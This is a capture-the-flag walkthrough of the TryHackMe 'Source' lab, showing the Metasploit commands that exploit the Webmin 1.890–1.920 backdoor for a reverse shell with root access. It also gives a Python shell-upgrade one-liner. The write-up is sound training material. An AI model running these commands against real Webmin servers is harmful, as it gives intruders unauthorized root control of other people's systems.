
## Source - TryHackMe
 
 
Welcome to this Walk-through Guide
Today, I will walk you through step by step on how to solve and pwn the Source machine on TryHackMe.

## Footprinting

So, we begin with an nmap scan and get the following result:

![1.png](/posts/res/source_1.png)

From the scan result, we can see that we have two ports open on our target machine: port 22 (SSH) and port 10000 (HTTP).

We have a web server running on a non-standard port, so let's head over to our web browser and check it out:

```
https://<IP>:10000
```

## Enumeration

Now, when we load up the address in our browser, we can see a login page for a software called ***webmin***. Essentially, I tried various default credentials to test for misconfiguration, but they didn't work.

![2.png](/posts/res/source_2.png)

My next approach was to check if a public exploit is available for the version of software running.

![3.png](/posts/res/source_3.png)

So, we can see that we have a backdoor in Webmin versions 1.890 through 1.920 which allows RCE.

## Exploitation

Now, let's load up our Metasploit console. We would be making use of the following exploit:

![4.png](/posts/res/source_4.png)

```
search webmin
use exploit/linux/http/webmin_backdoor 
```
```
show options
set RHOSTS <Target_IP>
set LHOST tun0
set SSL true
exploit
```

![5.png](/posts/res/source_5.png)

Now we have successfully gained a shell. Let's try to stabilize our current shell. First, we check if Python is available on the target machine using the following command:

```
which python
```

![7.png](/posts/res/source_7.png)

Cool! We have Python installed. Now, we run the following command to upgrade our shell:

```
python -c "import pty; pty.spawn('/bin/bash')"
```

![8.png](/posts/res/source_8.png)

Running the ***whoami*** command says we are the root user so there is no need for Priv-esc, now let's navigate the file system to find the flag.

To get the user flag, we head over to the following directory: ***/home/dark***

![9.png](/posts/res/source_9.png)

For the root flag, you know what to do 😉. 

--- 

